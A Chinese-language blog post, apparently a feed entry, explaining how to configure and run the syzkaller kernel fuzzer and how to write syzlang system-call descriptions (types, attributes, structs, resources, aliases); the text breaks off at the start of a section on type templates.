    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章在前面已经是埋了许多坑了，靠后的几篇文章都提到了我想学<code>syzkaller</code>，但是总有事耽搁以至于拖到了现在。本来没有打算将基本的使用方法写成文章的，但是就是前面的坑过多，如果不写出来的话就会觉得心里膈应。这一篇不会涉及到<code>syzkaller</code>的实现原理，只能默默祈祷不会太水。</p><p>一样的，这里也就不多提如何编译了，网上的资料很多。</p><h2 id="syzkaller使用"><a href="#syzkaller使用" class="headerlink" title="syzkaller使用"></a>syzkaller使用</h2><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p><img   src="/images/LxNvdhpEX2sBjYc.png" ></p><p>经常看我文章的朋友或许看出来了，我不是很愿意将图片上到博客，主要原因还是我没有使用图床所以尽量少的上传图片，所以我一般放到博客的图片都是较为有用的图片。</p><p>这里简单提一下上图：</p><p>首先<code>syz-manager</code>作为的是<code>syzkallmer</code>的控制中枢，其会启动多个vm实例 ( 图中一个黄色卡片代表一个实例 ) 并进行监视，同时通过<code>RPC</code>启动<code>syz-fuzzer</code>。</p><p><code>syz-fuzzer</code>负责引导整个fuzz的过程。第一步，生成input。第二步，启动<code>syz-executor</code>进程进行fuzz。第三步，从被fuzz的内核的<code>/sys/kernel/debug/kcov</code>获得覆盖 ( coverage ) 相关信息。最后，通过<code>RPC</code>将新的覆盖送回<code>syz-manager</code>。</p><p><code>syz-executor</code>负责执行单个输入。</p><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>在正式使用前我们需要为其额外编写配置文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;target&quot;</span>: <span class="string">&quot;linux/amd64&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:56741&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;workdir&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;kernel_obj&quot;</span>: <span class="string">&quot;/home/parallels/linux-5.11&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;image&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01/bullseye.img&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;sshkey&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01/bullseye.id_rsa&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;syzkaller&quot;</span>: <span class="string">&quot;/home/parallels/fuzz/gopath/syzkaller&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;procs&quot;</span>: <span class="number">8</span>,</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;qemu&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;vm&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;count&quot;</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="attr">&quot;kernel&quot;</span>: <span class="string">&quot;/media/psf/pwn/fuzz01/bzImage&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;cpu&quot;</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">&quot;mem&quot;</span>: <span class="number">2048</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$&#123;WORKDIR&#125;</code>是需要替换为所需的工作目录，之后生成的crash文件将会位于其中。<code>$&#123;LINUX&#125;</code>为Linux源码目录。<code>$&#123;IMAGE&#125;</code>为方才制作的系统镜像与密钥文件目录。<code>$&#123;GOPATH&#125;</code>替换为安装Syzkaller所使用的GOPATH。</p><h3 id="启动syzkaller"><a href="#启动syzkaller" class="headerlink" title="启动syzkaller"></a>启动syzkaller</h3><p>启动就很简单了，直接输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-manager -config=config.json <span class="comment"># config.json为前面提到的配置文件</span></span><br></pre></td></tr></table></figure><p>启动成功后通过访问<code>localhost:56741</code>即可获取到<code>syzkaller</code>的状态</p><h2 id="syzlang编写指南"><a href="#syzlang编写指南" class="headerlink" title="syzlang编写指南"></a>syzlang编写指南</h2><p>如果只是上述流程中那样一直挂着可以出洞的话，大公司的服务器可比我这电脑好得不知道哪去了，所以我们需要人工配置系统调用模板，以有针对性的进行漏洞挖掘。</p><p>syzkaller 使用它自己的声明式语言来描述系统调用模板，在安装目录下的 <code>docs/syscall_descriptions.md</code> 与 <code>docs/syscall_descriptions_syntax.md</code> 中有着相关的说明。</p><p>我们需要使用 syzlang 来编写特定的系统调用描述文件（也叫规则文件），syzkaller 会根据我们的描述文件有针对性地进行 fuzz。</p><h3 id="syzlang语法"><a href="#syzlang语法" class="headerlink" title="syzlang语法"></a>syzlang语法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syscallname <span class="string">&quot;(&quot;</span> [arg [<span class="string">&quot;,&quot;</span> arg]*] <span class="string">&quot;)&quot;</span> [type] [<span class="string">&quot;(&quot;</span> attribute* <span class="string">&quot;)&quot;</span>]</span><br><span class="line">arg = argname type</span><br><span class="line">argname = identifier</span><br><span class="line">type = <span class="keyword">typename</span> [ <span class="string">&quot;[&quot;</span> type-options <span class="string">&quot;]&quot;</span> ]</span><br><span class="line"><span class="keyword">typename</span> = <span class="string">&quot;const&quot;</span> | <span class="string">&quot;intN&quot;</span> | <span class="string">&quot;intptr&quot;</span> | <span class="string">&quot;flags&quot;</span> | <span class="string">&quot;array&quot;</span> | <span class="string">&quot;ptr&quot;</span> |</span><br><span class="line">   <span class="string">&quot;string&quot;</span> | <span class="string">&quot;strconst&quot;</span> | <span class="string">&quot;filename&quot;</span> | <span class="string">&quot;glob&quot;</span> | <span class="string">&quot;len&quot;</span> |</span><br><span class="line">   <span class="string">&quot;bytesize&quot;</span> | <span class="string">&quot;bytesizeN&quot;</span> | <span class="string">&quot;bitsize&quot;</span> | <span class="string">&quot;vma&quot;</span> | <span class="string">&quot;proc&quot;</span></span><br><span class="line">type-options = [type-opt [<span class="string">&quot;,&quot;</span> type-opt]]</span><br></pre></td></tr></table></figure><p>上述即是<code>syzlang</code>的语法结构，这简单介绍一下上面符号的含义。</p><blockquote><p><code>&quot;&quot;</code> 表示这个符号内的内容应按照其原样进行匹配</p><p><code>|</code>   表示的含义大差不差，意味取左右两边皆可</p><p><code>=</code>   表示左边的表达式应为右边的形式</p><p><code>[]</code> 表示取其内部的一个值</p><p><code>*</code>   表示和正则一样，即为0个或多个</p></blockquote><p>所以其写法为，<code>syscallname</code> + 多个<code>arg</code>组成。<code>arg</code>由标识符<code>identifier</code>与操作类型<code>type</code>构成。<code>type</code>由操作类型名<code>typename</code>以及对应类型的类型选择<code>type-options</code>组成，最后根据<code>typename</code>的不同，<code>type-options</code>跟一个或两个<code>type-opt</code>。</p><p>根据上述规则可以很轻松的理解Google官方提供的一个模板</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(file filename, flags flags[open_flags], mode flags[open_mode]) <span class="function">fd</span></span><br><span class="line"><span class="function"><span class="title">read</span><span class="params">(fd fd, buf buffer[out], count len[buf])</span></span></span><br><span class="line"><span class="function"><span class="title">close</span><span class="params">(fd fd)</span></span></span><br><span class="line"><span class="function">open_mode </span>= S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p>这里注释的写法就和<code>python</code>一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># aaaa</span></span><br></pre></td></tr></table></figure><p>文件包含的写法基本就和C一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include&lt;linux/fs.h&gt;</span><br></pre></td></tr></table></figure><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>前面中提到了参数的形式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg = argname + type</span><br></pre></td></tr></table></figure><p>其有一个参数名加一个操作类型构成。下面根据例子详细讲一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(read, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd, <span class="keyword">char</span> __user *, buf, <span class="keyword">size_t</span>, count)</span><br></pre></td></tr></table></figure><p>上述是内核中read系统调用的声明，当我们使用 libc 的 wrapper 进行 read 系统调用时，形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> my_file_fd = open(<span class="string">&quot;/dev/test&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">char</span> my_buf[<span class="number">114514</span>];</span><br><span class="line"><span class="keyword">size_t</span>my_count = <span class="number">114514</span>;</span><br><span class="line">read(my_file_fd, my_buf, my_count);</span><br></pre></td></tr></table></figure><p>在上述例子中<code>fd、buf、count</code>即为<code>argname</code>，<code>my_file_fd、my_buf、my_count</code>即为<code>type</code></p><p>那么在<code>syzlang</code>编写系统调用时就应该写为<code>fd my_file_fd</code>。( 这里假设<code>my_file_fd</code>已定义为<code>resources</code> )</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>前面提到了<code>arg</code>是由<code>argname type</code>构成，也提到了<code>type</code>是由<code>typename type-options</code>构成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type = <span class="keyword">typename</span> [ <span class="string">&quot;[&quot;</span> type-options <span class="string">&quot;]&quot;</span> ]</span><br></pre></td></tr></table></figure><p>首先这里详细提一下类型名，即该 type 的类型，例如 C 当中的int、char、void 等等。</p><p>常规的类型名包括：( <del>直接搬！</del>)</p><ul><li><strong>opt</strong>：这是一个可选参数（例如 mmap 的 fd）</li></ul><p>其余 type-options 是基于特定 type 的，如下：</p><ul><li><strong>const</strong>：整型常数<ul><li>类型选项：<ul><li>值（value）：例如 <code>0</code></li><li>基础类型（underlying type）：<code>intN</code> 或 <code>intptr</code> 之一</li></ul></li></ul></li><li><strong>intN</strong> 或 <strong>intptr</strong>：一个有着特殊含义的整型，下文会进行详细说明<ul><li>类型选项：<ul><li>可选范围区间：例如 <code>&quot;1:100&quot;</code> 表示取值值的区间为 <code>[1, 100]</code></li><li>可选参数</li></ul></li></ul></li><li><strong>flags</strong>：值的集合<ul><li>类型选项：<ul><li>对 flags 描述的引用</li><li>基础整型类型：例如 <code>int32</code></li></ul></li></ul></li><li><strong>array</strong>：一个可变长&#x2F;固定长度的数组<ul><li>类型选项：<ul><li>元素的 type</li><li>可选长度区间：例如固定长度 <code>&quot;5&quot;</code> 或者长度范围 <code>&quot;5:10&quot;</code>（包括边界）</li></ul></li></ul></li><li><strong>ptr</strong> 或 <strong>ptr64</strong>：指向一个对象的指针<ul><li>类型选项：<ul><li>方向：<code>in</code> 或 <code>out</code> 或 <code>inout</code></li><li>对象的 type</li></ul></li><li>无论对象指针大小如何，ptr64 永远为 8 字节</li></ul></li><li><strong>string</strong>：一块有着 0 终止符的内存缓冲区<ul><li>类型选项：<ul><li>常量字符串&#x2F;对字符串的引用<ul><li>前者：例如 <code>&quot;foo&quot;</code>作为常规字符串进行解析，或者<code>deadbeef</code>作为4个 16 进制字节进行解析</li><li>后者：若是特殊类型 <code>filename</code> 则会<strong>生成</strong>文件名</li></ul></li></ul></li></ul></li><li><strong>stringnoz</strong>：一块<strong>没有</strong> 0 终止符的内存缓冲区<ul><li>类型选项：（同 <code>string</code>)</li></ul></li><li><strong>glob</strong>：匹配目标文件的 glob（？）模式<ul><li>类型选项：<ul><li>用引号包裹着的模式字符串：例如 <code>&quot;/sys/&quot;</code> 或 <code>&quot;/sys/**/*/&quot;</code>，具体用法参见<a class="link"   href="https://pkg.go.dev/path/filepath#Match" >https://pkg.go.dev/path/filepath#Match<i class="fas fa-external-link-alt"></i></a></li></ul></li></ul></li><li><strong>fmt</strong>：一个表示一个整数的字符串<ul><li>类型选项：<ul><li>格式与值：前者可取值为 <code>dec</code>或 <code>hex</code> 或 <code>oct</code>；后者可以是一个 resource、int、flags、const 或 proc</li></ul></li><li>最终的结果通常是固定尺寸的</li></ul></li><li><strong>len</strong>：另一个 <code>字段</code> 的长度（对于 array 而言为元素的数量）<ul><li>类型选项：<ul><li>对象的 argname</li></ul></li></ul></li><li><strong>bytesize</strong>：与 len 类似，不过单位是<strong>字节</strong><ul><li>类型选项：<ul><li>对象的 argname</li></ul></li></ul></li><li><strong>bitsize</strong>：与 len 类型，不过单位是<strong>比特位</strong><ul><li>类型选项：<ul><li>对象的 argname</li></ul></li></ul></li><li><strong>offsetof</strong>：一个 <code>字段</code> 在其 parent struct 中的偏移<ul><li>类型选项：<ul><li><code>字段</code></li></ul></li></ul></li><li><strong>vma</strong> 或 <strong>vma64</strong>：指向一组页的指针（用作 mmap&#x2F;munmap&#x2F;mremap&#x2F;madvise 的输入）<ul><li>类型选项：<ul><li>（可选）页的数量或页的范围：前者例如 <code>vma[7]</code>，后者例如 <code>vma[2-4]</code></li></ul></li><li>vma64 的长度恒为 8 字节</li></ul></li><li><strong>proc</strong>：单个进程的整型（详见下面的描述）<ul><li>类型选项：<ul><li>值的区间的起始</li><li>每个进程的值的数量</li><li>基础类型</li></ul></li></ul></li><li><strong>text</strong>：特定 type 的机器码<ul><li>类型选项：<ul><li>代码类型：<code>x86_real</code>, <code>x86_16</code>, <code>x86_32</code>, <code>x86_64</code>, <code>arm64</code></li></ul></li></ul></li><li><strong>void</strong>：type with static size 0<ul><li>通常在模板以及可变长（varlen）联合体中使用，<strong>不能用作系统调用的参数</strong></li></ul></li></ul><p>在 <code>结构体/联合体/指针</code> 中使用时，<code>flags/len/flags</code> 的构成中尾部还可以跟着 type type-options</p><p>接着提一下类型选项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type-options = [type-opt [<span class="string">&quot;,&quot;</span> type-opt]]</span><br></pre></td></tr></table></figure><p>形式如上，从一开始的语法规则来看<code>type-options</code>对于<code>type</code>即为可选项，也可以同时拥有多个<code>type-options</code>，同样根据前面的语法规则可以看出来要使用<code>type-options</code>是应如下例一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flags flags[open_flags]</span><br></pre></td></tr></table></figure><p>上面这个例子的解析，我们这个参数名为<code>flags</code>参数，输入的类型为<code>flags</code>，其类型选项为对一个<code>flags</code>描述<code>open_flags</code>的应用，即为取<code>open_flags</code>中的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br></pre></td></tr></table></figure><p>其中的<code>open_flags</code>定义的内容如上，这些值可以通过<code>include</code>语句从内核源码中被包含进来。</p><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>在前面提到了系统调用的模板如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscallname <span class="string">&quot;(&quot;</span> [arg [<span class="string">&quot;,&quot;</span> arg]*] <span class="string">&quot;)&quot;</span> [type] [<span class="string">&quot;(&quot;</span> attribute* <span class="string">&quot;)&quot;</span>]</span><br></pre></td></tr></table></figure><p>其中除了<code>attribute</code>都已经做过一定解释了，这里在对其做分解分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode])</span><br><span class="line"></span><br><span class="line">open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p>这里对<code>open</code>系统调用，存在以下三个输入：</p><ul><li>file 参数：一个指针类型，其 type-opetions 的第一个为 <code>in</code>，意为由该指针指向特定对象，第二个为 <code>filename</code>，为特殊的 string 对象，对于 filename，syzlang 会进行文件生成，将文件名作为输入</li><li>flags 参数：一个 flags类型，其 <code>type-options</code> 为 <code>open_flags</code> ，意为从我们定义的 flags——<code>open_flags</code> 中取值</li><li>mode 参数：一个flags类型，其 <code>type-options</code> 为 <code>open_mode</code> ，意为从我们定义的 flags——<code>open_mode</code> 中取值</li></ul><p>一般来说，系统调用都会存在返回值，在<code>syzlang</code>中可以忽略掉返回值也可以选择接收，如果选择接收则应形如上式在系统调用后面加上一个<code>type</code>，例如<code>open</code>系统调用会返回一个文件描述符，若是我们像将其返回的的文件描述符存到一个变量中如<code>test_fd</code>，我们应当写成如下形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode]) test_fd</span><br><span class="line"></span><br><span class="line">open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p>既然文件描述符中已经存在我们的变量，那么在后续也是可以继续使用的，如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">close(fd test_fd)</span><br></pre></td></tr></table></figure><p>随后就是前面提到的，在<code>type</code>后还有一个可选参数<code>attribute</code>，其有以下可选值：</p><ul><li><code>disabled</code>：该系统调用将不用于 fuzzing；这个属性通常用于临时禁用某些系统调用，或者禁用特定的参数组合</li><li><code>timeout[N]</code>：系统调用在默认值以外的额外的超时时间，单位为毫秒（ms）</li><li><code>prog_timeoout[N]</code>：若一个程序包含了该系统调用，则该属性为整个程序的执行的超时时间，若存在多个定义了该属性的系统调用则取最大值</li><li><code>ignore_return</code>：在回退反馈中忽视这个系统调用的返回值；用于不返回固定的错误码（例如 -EFAULT）而是返回其他值的系统调用</li><li><code>break_returns</code>：忽略回退反馈中程序中所有后续系统调用的返回值</li></ul><p>接着就是系统调用的变种（variants）可以在系统调用名后面使用 <code>$</code> 符号进行额外的指定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socket$inet_tcp(domain <span class="keyword">const</span>[AF_INET], type <span class="keyword">const</span>[SOCK_STREAM], proto <span class="keyword">const</span>[<span class="number">0</span>]) sock_tcp</span><br><span class="line">socket$inet_udp(domain <span class="keyword">const</span>[AF_INET], type <span class="keyword">const</span>[SOCK_DGRAM], proto <span class="keyword">const</span>[<span class="number">0</span>]) sock_udp</span><br></pre></td></tr></table></figure><p>例如socket系统调用可以用于创建很多类型的socket，上述定义了两种不同的变体。而变种的作用主要是区分syscall，类似于别名的效果。</p><h3 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h3><p>整型也是一种 type，其可选项为 <code>int8</code> 、<code>int16</code>、<code>int32</code>、<code>int64</code>，表示相应大小的整型，<code>intptr</code> 用以表示一个<strong>指针大小</strong>的整型，对应 C 语言中的 <code>long</code>，通过添加 <code>be</code> 后缀表示这个整型存储为大端序。</p><p>可以用 int32[0:100] 或 int32[0:4096,512] 的格式为一个 512 对齐的 int 指定一个整数的值范围。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read$eventfd(fd fd_event, val ptr[out, int64], len len[val])</span><br></pre></td></tr></table></figure><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>在<code>syzlang</code>中同样可以存在结构体，联合体这一说，既然前面已经提到了这么多，这里就放一个它的一个语法结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">structname <span class="string">&quot;&#123;&quot;</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">(fieldname type (<span class="string">&quot;(&quot;</span> fieldattribute* <span class="string">&quot;)&quot;</span>)? <span class="string">&quot;\n&quot;</span>)+</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span> (<span class="string">&quot;[&quot;</span> attribute* <span class="string">&quot;]&quot;</span>)?</span><br></pre></td></tr></table></figure><p>可以看出来结构其实和c的很类似，定义一个<code>structname</code>，然后内部成员包含了<code>fieldname / type</code>以及后面可以添加<code>(fieldattribute)</code>，这里的属性与前面的是有一定差距的，这里的属性只有方向<code>in / out / inout</code></p><p>最后可以看到在结构体结尾可以被<code>[attribute]</code>来添加属性，这里存在以下属性：</p><ul><li><code>packed</code>：该结构体不同字段之间没有 padding（例如 C 中有一个结构体 <code>struct T&#123;int a; char b;&#125;;</code>，char 为 1 字节，int 为 4 字节，那么该结构体便会对 4 字节对齐，在其两个字段之间就会有 3 字节的 padding）</li><li><code>align[N]</code>：指定该结构体对 N 字节对齐，padding 的内容并未指定（通常为0）</li><li><code>size[N]</code>：结构体被填充到指定的大小 <code>N</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test_struct &#123;</span><br><span class="line">field0<span class="keyword">const</span>[<span class="number">1</span>, int32]  (in)</span><br><span class="line"><span class="function">field1<span class="title">int32</span>         <span class="params">(inout)</span></span></span><br><span class="line"><span class="function">field2<span class="title">fd</span><span class="params">(out)</span></span></span><br><span class="line"><span class="function">&#125; [packed]</span></span><br></pre></td></tr></table></figure><p>与结构体类似，联合体的语法结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unionname <span class="string">&quot;[&quot;</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">(fieldname type (<span class="string">&quot;(&quot;</span> fieldattribute* <span class="string">&quot;)&quot;</span>)? <span class="string">&quot;\n&quot;</span>)+</span><br><span class="line"><span class="string">&quot;]&quot;</span> (<span class="string">&quot;[&quot;</span> attribute* <span class="string">&quot;]&quot;</span>)?</span><br></pre></td></tr></table></figure><p>与前面的区别主要是最后的<code>[attribute]</code>中的可选性的区别，这里主要有：</p><ul><li><code>varlen</code>：联合体的大小可变（为指定的字段的长度），若未指定则该联合体大小为其最大字段的大小（类型 C 语言）</li><li><code>size[N]</code>：该联合体被填充到指定的大小 <code>N</code></li></ul><h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>资源的定义是作为一个系统调用的输出作为另一个系统调用输入的值。在前面的时候其实已经是提到过了，使用open系统调用打开的文件描述符再交由close系统调用进行关闭，如果要实现这样的效果则需要声明一个资源。资源的形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;resource&quot;</span> identifier <span class="string">&quot;[&quot;</span> underlying_type <span class="string">&quot;]&quot;</span> [ <span class="string">&quot;:&quot;</span> <span class="keyword">const</span> (<span class="string">&quot;,&quot;</span> <span class="keyword">const</span>)* ]</span><br></pre></td></tr></table></figure><p>其中的<code>identifier</code>即位其标识也就是名字，后面的<code>underlying_type</code> 可以是 <code>int8</code>, <code>int16</code>, <code>int32</code>, <code>int64</code>, <code>intptr</code> 或者是另一个资源。常量集合可以作为可选参数，表示该资源的特殊值（比如说 0xdeadbeef），特殊值偶尔被用作资源的值，若未指定特殊值，则会使用特殊值 <code>0</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">resource fd[int32]: <span class="number">0xffffffffffffffff</span>, AT_FDCWD, <span class="number">1000000</span></span><br><span class="line">resource sock[fd]</span><br><span class="line">resource sock_unix[sock]</span><br><span class="line"></span><br><span class="line">socket(...) <span class="function">sock</span></span><br><span class="line"><span class="function"><span class="title">accept</span><span class="params">(fd sock, ...)</span> sock</span></span><br><span class="line"><span class="function"><span class="title">listen</span><span class="params">(fd sock, backlog int32)</span></span></span><br></pre></td></tr></table></figure><p>资源不一定是系统调用的返回，他可以像其他任何数据一样被使用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">resource my_resource[int32]</span><br><span class="line"></span><br><span class="line">request_producer(..., arg ptr[out, my_resource])</span><br><span class="line">request_consumer(..., arg ptr[inout, test_struct])</span><br><span class="line"></span><br><span class="line">test_struct &#123;</span><br><span class="line">...</span><br><span class="line">attrmy_resource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于更为复杂的生产者&#x2F;消费者场景，字段属性也可以被利用，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">resource my_resource_1[int32]</span><br><span class="line">resource my_resource_2[int32]</span><br><span class="line"></span><br><span class="line">request_produce1_consume2(..., arg ptr[inout, test_struct])</span><br><span class="line"></span><br><span class="line">test_struct &#123;</span><br><span class="line">...</span><br><span class="line"><span class="function">field0<span class="title">my_resource_1</span><span class="params">(out)</span></span></span><br><span class="line"><span class="function">field1<span class="title">my_resource_2</span><span class="params">(in)</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="类型别名"><a href="#类型别名" class="headerlink" title="类型别名"></a>类型别名</h3><p>这个的形式很类似于C语言中的<code>typedef</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type identifier underlying_type</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type bool8int8[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type bool16int16[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type bool32int32[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type bool64int64[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">type boolptrintptr[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">type fileoff[BASE] BASE</span><br><span class="line"></span><br><span class="line">type filename <span class="built_in">string</span>[filename]</span><br><span class="line"></span><br><span class="line">type buffer[DIR] ptr[DIR, <span class="built_in">array</span>[int8]]</span><br></pre></td></tr></table></figure><p>在布尔中的取值返回就是0和1所以可以使用<code>intN[0:1]</code>来达到效果，不过在后面每次使用会使的易读性大打折扣，所以可以定义为bool。</p><h3 id="类型模板"><a href="#类型模板" class="headerlink" title="类型模板"></a>类型模板</h3><p>其形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 